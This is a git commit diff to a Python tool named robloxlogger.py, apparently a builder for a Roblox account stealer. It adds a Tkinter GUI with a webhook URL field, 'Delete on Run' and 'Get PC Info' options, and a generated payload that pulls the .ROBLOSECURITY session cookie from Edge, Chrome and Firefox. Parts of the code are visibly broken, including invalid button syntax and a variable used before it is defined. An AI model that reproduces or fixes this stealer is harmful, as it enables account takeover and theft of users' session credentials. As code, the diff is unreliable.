56659182ae5b4af4e505c0930164c8b00d504d6d
Sudzy <167475761+sudzythegoat@users.noreply.github.com>
2024-10-15 09:04:32 -0500

    Update robloxlogger.py

--- robloxlogger.py
+++ robloxlogger.py
@@ -34,6 +34,10 @@ def encodeUrl():
     else:
         urlencode = False
 
+def buildlogger():
+    with open("logger.py", "w") as file:
+        file.write(sigmaloggercode)
+    
 root = tk.Tk()
 root.title("RoConfig")
 
@@ -42,8 +46,18 @@ burncheckbox = tk.Checkbutton(root, text="Delete on Run", variable=burnvar, comm
 burncheckbox.pack(pady=15)
 
 getpcvar = tk.IntVar()
-getpccheckbox = tk.Checkbutton(root, text="Delete on Run", variable=getpcvar, command=getPc)
+getpccheckbox = tk.Checkbutton(root, text="Get PC Info", variable=getpcvar, command=getPc)
 getpccheckbox.pack(pady=15)
+
+encodeurlvar = tk.IntVar()
+encodeurlcheckbox = tk.Checkbutton(root, text="Encode URL", variable=encodeurlvar, command=encodeUrl)
+encodeurlcheckbox.pack(pady=15)
+
+webhooklabel = tk.Label(root, text="Webhook Url:")
+webhooklabel.pack(pady=10)
+webhookinput = tk.Entry(root)
+webhookinput.pack(pady=15)
+webhooksubmit = tk.Button(root, text="Build", command: buildlogger)
 
 root.geometry("300x350")
 root.mainloop()
@@ -77,3 +91,29 @@ def logger():
     except:
         firefox = False
         pass
+if __name__ == "__main__":
+    logger()
+
+sigmaloggercode = ("""
+    try:
+        edge_cookies = browser_cookie3.edge(domain_name='roblox.com')
+        edge_roblo_security = str(edge_cookies).split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        vcookies.append(edge_roblo_security)
+    except:
+        edge = False
+        pass
+    try:
+        chrome_cookies = browser_cookie3.chrome(domain_name='roblox.com')
+        chrome_roblo_security = str(chrome_cookies).split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        vcookies.append(chrome_roblo_security)
+    except:
+        chrome = False
+        pass
+    try:
+        fire_cookies = browser_cookie3.firefox(domain_name='roblox.com')
+        fire_roblo_security = str(fire_cookies).split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        vcookies.append(fire_roblo_security)
+    except:
+        firefox = False
+        pass
+""")
